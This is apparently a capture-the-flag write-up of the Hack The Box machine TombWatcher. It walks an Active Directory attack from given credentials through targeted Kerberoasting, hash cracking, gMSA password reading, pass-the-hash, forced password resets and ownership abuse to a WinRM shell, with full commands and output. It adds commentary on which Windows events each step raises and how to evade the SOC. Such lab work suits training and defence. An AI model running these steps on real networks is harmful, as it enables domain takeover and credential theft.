
Target : 10.129.41.160

Date : 17/07/2026

`Machine Information`

`As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!`


We'll start a nmap scan using a way stealthier approach than usual :
I could use `nmap -sC -sV -Pn -O --min-rate=3000 -T4` and it would work fine and be more efficient on this box. However, since this is my first **{PURPLE}** Black Box engagement, we'll be careful, as if this HTB box was a real engagement with a real **SOC/Blue Team** on the other side. That means reducing drastically the `SYN` rate to try and get a handshake on the ports : `ATT&CK T1046 Network Service Discovery` is `Active Reconnaissance` and can trigger alerts on the **Blue** side. If I used the aformentioned `nmap` super-efficient scan on a real target, it would send the **Blue** team dense SYN flood and script probes on many ports from one single source, potentially triggering an alert that would just block us while we're just reading the scan.

We'll instead do a `staged scan` which involves multiple scans : first - what ports are open (SYN-SYN/ACK-ACK) - then, `-sC -sV` at these specific ports (instead of scanning scripts and versions on all ports).

```bash
>  echo '10.129.41.160 tombwatcher.htb' | sudo tee -a /etc/hosts
Please touch the FIDO authenticator.  
10.129.41.160 tombwatcher.htb
>  mkdir -p ~/tmp/Tombwatcher
```

First step of the staged nmap scan :

```bash
> sudo nmap -Pn -p- --max-rate=500 -T3 -oA ~/tmp/Tombwatcher/nmap_all 10.129.41.160
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-17 22:08 +0200  
Nmap scan report for tombwatcher.htb (10.129.41.160)  
Host is up (0.046s latency).  
Not shown: 65514 filtered tcp ports (no-response)  
PORT      STATE SERVICE  
53/tcp    open  domain  
80/tcp    open  http  
88/tcp    open  kerberos-sec  
135/tcp   open  msrpc  
139/tcp   open  netbios-ssn  
389/tcp   open  ldap  
445/tcp   open  microsoft-ds  
464/tcp   open  kpasswd5  
593/tcp   open  http-rpc-epmap  
636/tcp   open  ldapssl  
3268/tcp  open  globalcatLDAP  
3269/tcp  open  globalcatLDAPssl  
5985/tcp  open  wsman  
9389/tcp  open  adws  
49666/tcp open  unknown  
49695/tcp open  unknown  
49696/tcp open  unknown  
49698/tcp open  unknown  
49717/tcp open  unknown  
49721/tcp open  unknown  
49743/tcp open  unknown
```

We use `-T3` which isn't the stealthiest but for just a fullport handshake scan it should be stealthy enough. `--max-rate=500` creates a ceiling where `--min-rate=3000` created a floor for packets per second, making it much stealthier than the aggressive counterpart.

Second step of the staged nmap scan :

```bash
>ports=$(grep '/tcp' ~/tmp/Tombwatcher/nmap_all.nmap | grep open | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//'); sudo nmap -Pn -p"$ports" -sC -sV --max-rate 300 -T3 -oA ~/tmp/Tombwatcher/nmap_svc 10.129.41.160
```

This does `-sC -sV` which is `script scan & version scan` using our first scan results to target specific ports and not spread it everywhere. The `--max-rate 300` is making it even stealthier.

Both commands for a simple first fullport scan include a lot of regex and long, complex bash, so we'll just create a function to make the `staged nmap scan` actually bearable.

The results are :

```bash
Nmap done: 1 IP address (1 host up) scanned in 262.71 seconds  
[*] Stage 2/2 — -sC -sV on: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49695,49696,49698,49717,49721,49743  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-17 22:13 +0200  
Nmap scan report for tombwatcher.htb (10.129.41.160)  
Host is up (0.058s latency).  
  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus  
80/tcp    open  http          Microsoft IIS httpd 10.0  
| http-methods:    
|_  Potentially risky methods: TRACE  
|_http-server-header: Microsoft-IIS/10.0  
|_http-title: IIS Windows Server  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-18 00:13:19Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb  
| Not valid before: 2024-11-16T00:47:59  
|_Not valid after:  2025-11-16T00:47:59  
|_ssl-date: 2026-07-18T00:14:48+00:00; +4h00m00s from scanner time.  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-07-18T00:14:49+00:00; +4h00m00s from scanner time.  
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb  
| Not valid before: 2024-11-16T00:47:59  
|_Not valid after:  2025-11-16T00:47:59  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-07-18T00:14:48+00:00; +4h00m00s from scanner time.  
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb  
| Not valid before: 2024-11-16T00:47:59  
|_Not valid after:  2025-11-16T00:47:59  
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb  
| Not valid before: 2024-11-16T00:47:59  
|_Not valid after:  2025-11-16T00:47:59  
|_ssl-date: 2026-07-18T00:14:49+00:00; +4h00m00s from scanner time.  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
9389/tcp  open  mc-nmf        .NET Message Framing  
49666/tcp open  msrpc         Microsoft Windows RPC  
49695/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
49696/tcp open  msrpc         Microsoft Windows RPC  
49698/tcp open  msrpc         Microsoft Windows RPC  
49717/tcp open  msrpc         Microsoft Windows RPC  
49721/tcp open  msrpc         Microsoft Windows RPC  
49743/tcp open  msrpc         Microsoft Windows RPC  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
| smb2-time:    
|   date: 2026-07-18T00:14:11  
|_  start_date: N/A  
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 97.29 seconds
```

Active Directory. `DNS:DC01.tombwatcher.htb` that we'll add immediately to our hosts, a `clock-skew: mean: 3h59m59s` that'll need `ntpdate` later, `DNS 53/tcp` and `http 80/tcp` as outliers and the usual AD suspects : `kerberos 88/tcp ; msrpc 135/tcp ; netBIOS 139/tcp ; LDAP 389/tcp & 3268/tcp ; SMB 445/tcp ; WinRM 5985/tcp` as well as `Microsoft Windows RPC` and some other ports.

We add the `DC` to our hosts :

```bash
>  echo '10.129.41.160 DC01.tombwatcher.htb' | sudo tee -a /etc/hosts  
  
Please touch the FIDO authenticator.  
10.129.41.160 DC01.tombwatcher.htb
```

We then use `netexec` on `SMB 445/tcp` with the credentials that were given to us by the Machine Information :

```bash
>  nxc smb tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' --shares  
SMB         10.129.41.160   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB         10.129.41.160   445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!    
SMB         10.129.41.160   445    DC01             [*] Enumerated shares  
SMB         10.129.41.160   445    DC01             Share           Permissions            Remark  
SMB         10.129.41.160   445    DC01             -----           -----------            ------  
SMB         10.129.41.160   445    DC01             ADMIN$                                 Remote Admin  
SMB         10.129.41.160   445    DC01             C$                                     Default share  
SMB         10.129.41.160   445    DC01             IPC$            READ                   Remote IPC  
SMB         10.129.41.160   445    DC01             NETLOGON        READ                   Logon server share    
SMB         10.129.41.160   445    DC01             SYSVOL          READ                   Logon server share    
```

Login succeeded, however, `READ` on `NETLOGON, SYSVOL, IPC$` means there's a high chance we're going to find little to nothing here. We might come back later if we get stuck.

**Blue** : `Since we succeeded on a direct login, the only SOC alert is one 4624 (Type 3 SMB) and one 5140 (SMB shares check) so pretty much invisible or very low alert in the alert noise of usual corporations.`

MITRE ATT&CK ID : T1078 (Valid Accounts)

We aren't stuck at `guest%`. we've got actual `User Credentials`, a Human Valid DC Account.

We start `Bloodhound-CE` :

```bash
>  cd ~/bloodhound-ce  
sudo docker-compose up -d  
Please touch the FIDO authenticator.  
[+] up 3/3  
✔ Container bloodhound-ce-app-db-1     Healthy                                                                                                                                                               6.1s  
✔ Container bloodhound-ce-graph-db-1   Healthy                                                                                                                                                              42.1s  
✔ Container bloodhound-ce-bloodhound-1 Started
```

And get the `.zip database` using `henry`'s credentials and `rusthound-ce` :

```bash
>  rusthound-ce -d tombwatcher.htb -u 'henry@tombwatcher.htb' -p 'H3nry_987TGV!' -f DC01.tombwatcher.htb -i 10.129.41.160 -n 10.129.41.160 -c All -z -o ~/tmp/Tombwatcher/bh  
---------------------------------------------------  
Initializing RustHound-CE at 23:02:28 on 07/17/26  
Powered by @g0h4n_0  
---------------------------------------------------  
  
[2026-07-17T21:02:28Z INFO  rusthound_ce] Verbosity level: Info  
[2026-07-17T21:02:28Z INFO  rusthound_ce] Collection method: All  
[2026-07-17T21:02:28Z INFO  rusthound_ce::ldap] Connected to TOMBWATCHER.HTB Active Directory!  
[2026-07-17T21:02:28Z INFO  rusthound_ce::ldap] Starting data collection...  
[2026-07-17T21:02:28Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2026-07-17T21:02:33Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb  
[2026-07-17T21:02:33Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2026-07-17T21:02:34Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=tombwatcher,DC=htb  
[2026-07-17T21:02:34Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2026-07-17T21:02:34Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=tombwatcher,DC=htb  
[2026-07-17T21:02:34Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2026-07-17T21:02:34Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=tombwatcher,DC=htb  
[2026-07-17T21:02:34Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2026-07-17T21:02:38Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=tombwatcher,DC=htb  
[2026-07-17T21:02:38Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...  
⡀ Parsing LDAP objects: 15%                                                                                                                                                                                         
[2026-07-17T21:02:38Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10  
⠠ Parsing LDAP objects: 73%                                                                                                                                                                                         
[2026-07-17T21:02:38Z INFO  rusthound_ce::objects::enterpriseca] Found 11 enabled certificate templates  
[2026-07-17T21:02:38Z INFO  rusthound_ce::api] Parsing LDAP objects finished!  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::maker::common] 9 users parsed!  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::maker::common] 61 groups parsed!  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::maker::common] 33 certtemplates parsed!  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!  
[2026-07-17T21:02:38Z INFO  rusthound_ce::json::maker::common] /home/vagabond/tmp/Tombwatcher/bh/20260717230238_tombwatcher-htb_rusthound-ce.zip created!  
  
RustHound-CE Enumeration Completed at 23:02:38 on 07/17/26! Happy Graphing!
```

The `LDAP parsing` is where we start to be less sneaky. We did `-c All`, not `-c DCOnly` since the `DC` on this box is in a single real computer. In a real-world engagement, this would trigger suspicion.

**Blue** : `Event 4662 : Directory Service Access` and `Event 1644 : LDAP diagnostic / MDI sensor telemetry` which is usually `evidence (Medium Severity).`

This is **Bloodhound-like** behavior and an `LDAP sweep` that's with the exact same user that triggered the `4624 Login Successful Type 3 (SMB)` and the `5140 SMB Shares Listing` minutes ago. Suddenly those benign first alerts correlate with a broad LDAP enumeration.

This might become an actual case for the Blue Team. But since we didn't do anything with that data (yet) it's not a severe alert. We'll quickly need to pivot to another account than henry though, since he's the account correlated to that initial `LDAP sweep` we did to get our `Bloodhound-CE` .zip file using `rusthound`. In theory we'd also need to change our IP address (our `tun0` VPN which if we did a good job would match the DC users' usual IPs/VPN structure) when we move from account to another, but since this is a HTB engagement and our VPN is locked to the actual box, we can't.

We upload `20260717230238_tombwatcher-htb_rusthound-ce.zip` on `Bloodhound-CE` and see that `Henry` has an Outbound Control : `WriteSPN` on `Alfred`.

We'll try to find a `servicePrincipalName` that isn't too obvious like `WSMan/DC01.tombwatcher.htb`, aligning with a `WinRM 5985/tcp` role.

We'll then fire our `WriteSPN` which should get our `henry` case from `Medium Severity` to `High Severity` , but since we're simulating a real-world environment where companies get tons of alerts, be it noise or real intrusion threats, and we waited an hour, the alert won't necessarily correlate with our `LDAP sweep` and might get buried under the Alert Fatigue and the noise for now and be deprioritized.

```bash  
>  /usr/bin/bloodyad --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' set object alfred servicePrincipalName -v 'WSMan/DC01.tombwatcher.htb'  
[+] alfred's servicePrincipalName has been updated
```

We triggered `EventID=5136` : a directory service object was modified.

MITRE ATT&CK ID : T1098 Account Manipulation

**Blue** : We waited long enough before triggering this, and if the SOC team doesn't look into it it'll just see a DC item modified which is noise if it doesn't have context. Unfortunately for us, if they go past the noise and aren't on higher severity cases (like multiple `4625`/`4624` from one source which would theoretically indicate ATT&CK T1110.003 `passwordspray`, `Mimikatz` or `unknown/malicious file hashes`, `4624` on a high privileged account from an unknown source, `.ps1` file injections...) they'll catch us. So we'll bet that the company is already flooded with malicious attackers and bots or that their SOC team doesn't correlate our `5136` with our previous actions because of the time we waited.

We'll then get into more dangerous territory. Now that `alfred` has a `SPN`, we can use `GetUserSPNs.py` to request a kerberos ticket.

First, we skew :

```bash
>  sudo ntpdate -u 10.129.41.160  
  
Please touch the FIDO authenticator.  
18 Jul 04:46:25 ntpdate[78780]: step time server 10.129.41.160 offset +14400.114837 sec
```

Then, we use `Impacket` to get a `kerberos hash TGS eType 23`.
We'll crack the password offline as fast as possible using the appropriate hashcat mode :

```bash
>  GetUserSPNs.py -dc-ip 10.129.41.160 -dc-host DC01.tombwatcher.htb tombwatcher.htb/'henry':'H3nry_987TGV!' -request -outputfile ~/tmp/Tombwatcher/alfred.hash  
  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies    
  
ServicePrincipalName        Name    MemberOf  PasswordLastSet             LastLogon  Delegation    
--------------------------  ------  --------  --------------------------  ---------  ----------  
WSMan/DC01.tombwatcher.htb  Alfred            2025-05-12 17:17:03.526670  <never>                  
  
  
  
[-] CCache file is not found. Skipping...  
>  hashcat -m 13100 ~/tmp/Tombwatcher/alfred.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
hashcat (v7.1.2) starting  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
  
ATTENTION! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append -O to your commandline.  
See the above message to find out about the exact limits.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 514 MB (12063 MB free)  
  
Dictionary cache hit:  
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
* Passwords.: 14344384  
* Bytes.....: 139921497  
* Keyspace..: 14344384  
  
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$1143fdfa56c8b5e530d4846c9fc04464$f4b02bf0645e41efc2042aa8fbb9403169bc55d64790c6e94d43e73024013ff48b8473fa79d8191bb806fda3992175e5a0d1ddeb0a080e69fee86  
f40d1a5014e77d544c5d58c27a941600a440a7ff5ef7064f6b1462056c9c17af06baff3bd55105b49c61fef525d67947ede38c6e4fbab53e0c968c5a8ab4e5de182077976f93bf81c1010081651685c5e38a78937e2405398a5d03686b043f882b131bd65e33d3fcd6  
a840faad474b04fcfa13e5a67aa9fc99eecb7e1ce85b7a419ab95f67f057a87b1129e21a7bc7fc402e288766857ff590e9ce1ebc2ca81f61dc95241376129c4fd80299272f6099b56fdc6c6755231784a21e303850bb9cdc53eb9defda96e01b1082f320493bfda12d  
79bb83541a984b3df87a415b53da461bcee4d0e55c13933609822d3fb261fed0ad7d53a261c76804af292cb03564e4f6f327e5bda5eb1c307f93e8fb28f6022fee9e5e7d5479e56100ed5e4bf3e613710d9e3822dad26e58a1aa6e93a816e059587331c31434606683  
dc1413e76d15aae6bf9661ed581c378cb0ad0c1b1b192ef3fa03e1801d772f9c882a69803a45a481d78208c8608aa053bfba9437d2f8d3e120164239a6d33932cea1e486776da8968ae75867567b44ff2065e0e6adc32923b63e4bb9a7671b5ba3daf3f826711ea2c7  
f89b77fc7edc2af16d9becc4cd467eb10e6c13e8150b90a2e0b1e6583f067b6dd6c457a9c26b6cfe52440fb47bf0f9fb2a236d0280e1c4d08843bb999af05a2cf8f77ffe98d6c14a3ef4e0cc8f2090bb8cf665d491e885060a6f70a7df4fe26c51a7ddb1f659e7d95f  
e1cf887a08058b9ab1b252f5fad0a768bf99a708d417818d934463ade98f8c3479e96684b5f4bbb6d3241b6f218368504006d733449fb6c62c1bd29fdb64e8865c727c37aa2f43f9c17796c7ff024ac93b318e4e72d1491e5d57bf7b96968cd4f1ab2d5f1979a6d73d  
3ea9d9b83aa77dabc047e0909291e3d7d5727146e19865644cff4c748211c347bc27c5d5d5675ea99f95c8e0efc7a09c36e9f99c9cf964e44f606a9dda66707daf48d04b80723379b5d0ffef7b6d085f16b7889971f60833faead22c159268cdf63621438cfeea0b8c  
4937cd193442a279638bbfecbc6f5f8b2644b2474b9cc33c86208a744070740000d9c8460a05e77dccfbc2deff289aaf13c8aa4283e8a8fcd547180320ec8e377dec2a683e424461eb059b9bb21766cd21137e8f3f7412498ea6d09c52849a8965030667fe77c854df  
9b645cfe157ba3955dc7bed060d01cb28c47764cc0d03c29fce1d3613f81c859a6d348c592fab7ecbe6aaf3d151501dd1a9a847659105492678b44438c8c507c8ea5a2242edf82e1cbc0afdbb54669d751b4dc7f8fd19b7e1f14c627e46db932996142f717080d84c6  
b472437ec74982ccf65c01243a09f1647d75990bd0799b6437e7914df89a8e862a0599127615987dc9a:basketball  
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)  
Hash.Target......: $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb...87dc9a  
Time.Started.....: Sat Jul 18 05:03:59 2026 (0 secs)  
Time.Estimated...: Sat Jul 18 05:03:59 2026 (0 secs)  
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)  
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........:  1206.3 kH/s (4.48ms) @ Accel:1024 Loops:1 Thr:1 Vec:8  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 8192/14344384 (0.06%)  
Rejected.........: 0/8192 (0.00%)  
Restore.Point....: 0/14344384 (0.00%)  
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#01...: 123456 -> total90  
Hardware.Mon.#01.: Temp: 68c Util: 19%  
  
Started: Sat Jul 18 05:03:58 2026  
Stopped: Sat Jul 18 05:04:01 2026
```

We got `alfred:basketball`.

MITRE ATT&CK ID : T1558.003 Steal or Forge Kerberos Tickets: Kerberoasting

**Blue** : `Event ID 4769 A service ticket was requested` : High alert since `henry` is a non-service account that : `modified a domain object : 5136 - user-account SPN` and used this SPN to request a ticket `4769`.

`Account Manipulation → Steal/Forge Kerberos Tickets` is a strong near-real-time case, and this is where a tuned SOC can interrupt the engagement : `4769` right after the same principal’s SPN write can lead to an immediate block of both `alfred` and `henry` preventing any further `Domain Compromise`.

But direct detections may miss isolated events. Correlation and prevent-controls decide whether this dies early or becomes a DFIR case.

SIEM will link this event to the previous ones coming from `henry` : `4624 → 5140 → 4662/1644 → 5136 → 4769` and immediately flag this case as high priority.
  
**Blue / SOC (direct):** `4769` right after the same principal’s SPN write is a strong near-real-time case: Account Manipulation → Steal/Forge Kerberos Tickets (`T1098` → `T1558.003`). This is where a tuned SOC can interrupt before password crack finishes — offline crack itself is invisible, the ticket request is not.

We'll remove `alfred`'s `servicePrincipalName` to cleanup a little, even if it triggers another `5136` event :

```bash
>  /usr/bin/bloodyad --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' set object alfred servicePrincipalName  
  
[+] alfred's servicePrincipalName has been updated
```

**Blue** : Another `5136` event ID. Clearing the SPN removes a lasting IOC on alfred.
SIEM still has `4624 → 5140 → 4662/1644 → 5136 → 4769` on `henry` but the `Digital Forensics and Incident Response` team will have one thing missing from the case.
If SOC missed it, CTI/hunters still string: henry source IP → LDAP sweep → SPN write → TGS request → later alfred `4624`.
Time delay only helps if nobody is correlating identity events, this is why we start moving fast now.

```bash
>  nxc smb DC01.tombwatcher.htb -u 'alfred' -p 'basketball'  
  
SMB         10.129.41.160   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB         10.129.41.160   445    DC01             [+] tombwatcher.htb\alfred:basketball
```

`alfred:basketball` confirmed with `netexec` , `EventID=4624`

MITRE ATT&CK ID : T1078 - Valid Accounts

`alfred` can `AddSelf` to the `INFRASTRUCTURE@TOMBWATCHER.HTB` group which has `ReadGMSAPassword` on `ANSIBLE_DEV$`.

This is big. We'll start by adding `alfred` to the `Infrastructure` group.

```bash
>  /usr/bin/bloodyad --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'alfred' -p 'basketball' add groupMember 'INFRASTRUCTURE' 'alfred'  
  
[+] alfred added to INFRASTRUCTURE
```

**Blue** `EventID=4728 (Global) or 4732 (Local)`, suspect because `alfred` added himself to the group. Even more suspect if it's linked to `henry` via SIEM : it begins to look like a tentative to overtake the whole domain. Especially with what comes next.

MITRE ATT&CK ID : T1098.001 Account Manipulation - Group Membership Addition

We then use our `Outbound Control` as a member of `Infrastructure` to read the `gMSA password` :

```bash
>  nxc ldap DC01.tombwatcher.htb -u 'alfred' -p 'basketball' --gmsa  
  
LDAP        10.129.41.160   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)    
LDAP        10.129.41.160   389    DC01             [+] tombwatcher.htb\alfred:basketball    
LDAP        10.129.41.160   389    DC01             [*] Getting GMSA Passwords  
LDAP        10.129.41.160   389    DC01             Account: ansible_dev$         NTLM: 47f92356b62e2b1c7b185df4842b63ad     PrincipalsAllowedToReadPassword: Infrastructure  
LDAP        10.129.41.160   389    DC01             Account: ansible_dev$         aes128-cts-hmac-sha1-96: 5830408ace5d9b31236adddbedd1f0a2  
LDAP        10.129.41.160   389    DC01             Account: ansible_dev$         aes256-cts-hmac-sha1-96: 764bcf6f656767016283fc0bc73a38e85dc310ab48122c47c1d50bd6e68fbe47
```

MITRE ATT&CK ID : T1555.005: Credentials from Password Stores

**Blue** : We have triggered a critical event inside the domain :
`Event ID 4662 (Directory Service Access)` specifically for the `msDS-ManagedPassword`.
Valid path (`Infrastructure` group) might slightly delay the alert but we need to move and pivot fast now.

`ANSIBLE_DEV$` has `ForceChangePassword` on `Sam` who has `WriteOwner` on `John`.

```bash
>  nxc smb DC01.tombwatcher.htb -u 'ansible_dev$' -H '47f92356b62e2b1c7b185df4842b63ad'  
  
SMB         10.129.41.160   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB         10.129.41.160   445    DC01             [+] tombwatcher.htb\ansible_dev$:47f92356b62e2b1c7b185df4842b63ad
```

We effectively own `ANSIBLE_DEV$` with `Pass-The-Hash` for now.

We use `Impacket` to `changepasswd` on `Sam`, verify with netexec and pivot quickly :

```bash
>  changepasswd.py 'tombwatcher.htb/sam'@DC01.tombwatcher.htb -newpass 'SamTw2026!' -altuser 'ansible_dev$' -althash '47f92356b62e2b1c7b185df4842b63ad' -reset -protocol smb-samr -dc-ip 10.129.41.160  
  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Setting the password of tombwatcher.htb\sam as tombwatcher.htb\ansible_dev$  
[*] Connecting to DCE/RPC as tombwatcher.htb\ansible_dev$  
[*] Password was changed successfully.  
[!] User no longer has valid AES keys for Kerberos, until they change their password again
>  nxc smb DC01.tombwatcher.htb -u 'sam' -p 'SamTw2026!'  
  
SMB         10.129.41.160   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB         10.129.41.160   445    DC01             [+] tombwatcher.htb\sam:SamTw2026!
```

We'll now take ownership of `john`, change `sam`'s permissions to `GenericAll` on `john` and change `john`'s password :

```bash
>  /usr/bin/bloodyad --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'sam' -p 'SamTw2026!' set owner 'john' 'sam'  
  
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john  
>  /usr/bin/bloodyad --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'sam' -p 'SamTw2026!' add genericAll 'john' 'sam'  
  
[+] sam has now GenericAll on john  
>  /usr/bin/bloodyad --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'sam' -p 'SamTw2026!' set password 'john' 'Scrow123&'  
  
[+] Password changed successfully!
```

**Blue** : This is high severity behavior, first `EventID=4738` with `john` ownership change to `sam`, then `EventID=5136` because we changed our permission rights on `sam` and then `4724` change of password, in a matter of seconds from the same source, this is very high alert.

MITRE ATT&CK ID : T1098 Account Manipulation and T1078 Valid Accounts

We try WinRM with john :

```bash
>  nxc winrm tombwatcher.htb -u john -p 'Scrow123&'  
WINRM       10.129.41.160   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)    
WINRM       10.129.41.160   5985   DC01             [+] tombwatcher.htb\john:Scrow123& (Pwn3d!)

>  evil-winrm -i DC01.tombwatcher.htb -u 'john' -p 'Scrow123&'  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
